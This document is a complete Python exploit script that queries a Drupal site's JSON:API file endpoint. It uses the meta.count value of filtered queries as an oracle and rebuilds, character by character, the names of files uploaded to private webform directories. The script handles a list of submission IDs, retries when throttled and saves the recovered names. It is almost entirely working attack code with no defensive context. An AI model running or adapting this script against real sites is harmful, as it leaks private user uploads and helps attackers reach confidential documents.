#!/usr/bin/env python3
"""
Reconstructs file names from Drupal private directories via the JSON:API meta.count oracle.

Usage :  ./jsonapi-read.py -d ids.txt -p private_path
         ./jsonapi-read.py -d ids.txt -p private_path -o names.txt --delay 0.3
         ./jsonapi-read.py -d ids.txt -p private_path -l 80 -u https://domain.local
"""
import argparse, datetime, json, string, time, urllib.error, urllib.parse, urllib.request

_reqs   = 0
API     = None     # set from --url
DELAY   = 0.0      # set from --delay
RETRIES = 5        # set from --retries
TIMEOUT = 25       # set from --timeout


def _fetch(params):
    """One API call returning meta.count, with backoff on 429 and transient errors."""
    global _reqs
    url = API + '?' + urllib.parse.urlencode(params)
    for attempt in range(RETRIES):
        try:
            _reqs += 1
            with urllib.request.urlopen(url, timeout=TIMEOUT) as r:
                data = json.loads(r.read().decode())['meta']['count']
            if DELAY:
                time.sleep(DELAY)
            return data
        except urllib.error.HTTPError as e:
            if e.code == 429 and attempt < RETRIES - 1:
                wait = e.headers.get('Retry-After')
                wait = float(wait) if wait and wait.isdigit() else 2 ** attempt
                print(f'    [429] throttled, waiting {wait:.0f}s '
                      f'(attempt {attempt + 1}/{RETRIES})', flush=True)
                time.sleep(wait)
                continue
            raise
        except (urllib.error.URLError, TimeoutError) as e:
            if attempt < RETRIES - 1:
                wait = 2 ** attempt
                print(f'    [net] {e}, retrying in {wait:.0f}s '
                      f'(attempt {attempt + 1}/{RETRIES})', flush=True)
                time.sleep(wait)
                continue
            raise


def count(prefix):
    return _fetch({'filter[uri.value][operator]': 'STARTS_WITH',
                   'filter[uri.value][value]': prefix, 'page[limit]': '0'})


def gt(prefix, probe):
    return _fetch({'filter[a][path]': 'uri.value', 'filter[a][operator]': 'STARTS_WITH',
                   'filter[a][value]': prefix,
                   'filter[b][path]': 'uri.value', 'filter[b][operator]': '>',
                   'filter[b][value]': probe, 'page[limit]': '0'})


ALPHA = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_-. ()&+'"
EXTS  = ('.pdf', '.docx', '.doc', '.odt', '.rtf')


def branches(base):
    return [(ch, n) for ch in ALPHA if (n := count(base + ch))]


def extract(base, seed, limit):
    cur = seed
    while len(cur) < limit and not cur.lower().endswith(EXTS):
        n = count(base + cur)
        if n == 0:
            print('    prefix not found:', repr(cur)); return None
        if n > 1:                       # several files: drill down to isolate one
            nxt = next((ch for ch in ALPHA if count(base + cur + ch)), None)
            if nxt is None:
                print(f'    {n} files share exactly {cur!r} — different extensions?')
                return cur
            cur += nxt
            continue
        if gt(base + cur, base + cur) != 1:   # nothing beyond this prefix
            break
        lo, hi = 32, 255
        while lo < hi:                        # binary search over the byte value
            mid = (lo + hi + 1) // 2
            if gt(base + cur, base + cur + chr(mid)) == 1: lo = mid
            else: hi = mid - 1
        cur += chr(lo)
        print(f'    req={_reqs:<6} len={len(cur):<3} {cur}')
    return cur


def process(sid, form, limit):
    """Process one submission ID and return the list of reconstructed names."""
    base = f'private://webform/{form}/{sid}/'
    print(f'\n[+] sid={sid}  base: {base}')
    total = count(base)
    if total == 0:
        print('    no files (nonexistent or empty sid)')
        return []
    print(f'    {total} file(s)')
    br = branches(base)
    print(f'    branches: {br}')
    found = []
    for ch, n in br:
        print(f'    --- branch {ch!r} ({n} file(s)) ---')
        name = extract(base, ch, limit)
        if name:
            found.append(name)
    return found


def read_ids(path):
    """Read one ID per line, skipping blank lines and comments (#)."""
    with open(path, encoding='utf-8') as f:
        return [s for ln in f if (s := ln.strip()) and not s.startswith('#')]


def main():
    global API, DELAY, RETRIES, TIMEOUT
    ap = argparse.ArgumentParser(
        description="Reconstruct file names in Drupal private directories via meta.count (JSON:API).")
    ap.add_argument('-d', '--ids-file', required=True, metavar='FILE',
                    help='file containing one submission ID per line')
    ap.add_argument('-p', '--private-dir', required=True, metavar='FORM',
                    help='machine name of the target webform (e.g. private_path)')
    ap.add_argument('-o', '--output', metavar='FILE',
                    help='write reconstructed names to FILE (one "sid<TAB>name" per line)')
    ap.add_argument('-u', '--url', default='https://www.test.local',
                    help='target base URL (default: https://www.test.local)')
    ap.add_argument('-l', '--limit', type=int, default=70,
                    help='max length of a reconstructed name (default: 70)')
    ap.add_argument('--delay', type=float, default=0.0, metavar='SEC',
                    help='pause between requests to avoid throttling (default: 0)')
    ap.add_argument('--retries', type=int, default=5,
                    help='attempts on 429 / network errors (default: 5)')
    ap.add_argument('--timeout', type=int, default=25,
                    help='per-request timeout in seconds (default: 25)')
    args = ap.parse_args()

    API, DELAY, RETRIES, TIMEOUT = (args.url.rstrip('/') + '/fr/jsonapi/file/file',
                                    args.delay, args.retries, args.timeout)

    try:
        ids = read_ids(args.ids_file)
    except OSError as e:
        raise SystemExit(f'[!] cannot read file: {e}')
    if not ids:
        raise SystemExit('[!] no IDs found in file')

    print(f'[+] target: {API}')
    print(f'[+] form:   {args.private_dir}')
    print(f'[+] {len(ids)} ID(s) to process')

    results = {}
    for sid in ids:
        results[sid] = process(sid, args.private_dir, args.limit)

    print(f'\n=== reconstructed names ({sum(len(v) for v in results.values())}) ===')
    for sid, names in results.items():
        for name in names:
            print(f'  {sid}\t{name}')

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as out:
            out.write(f'# form={args.private_dir} date={datetime.date.today().isoformat()}\n')
            for sid, names in results.items():
                for name in names:
                    out.write(f'{sid}\t{name}\n')
        print(f'\n[+] written to {args.output}')

    print(f'\n[+] total requests: {_reqs}')


if __name__ == '__main__':
    main()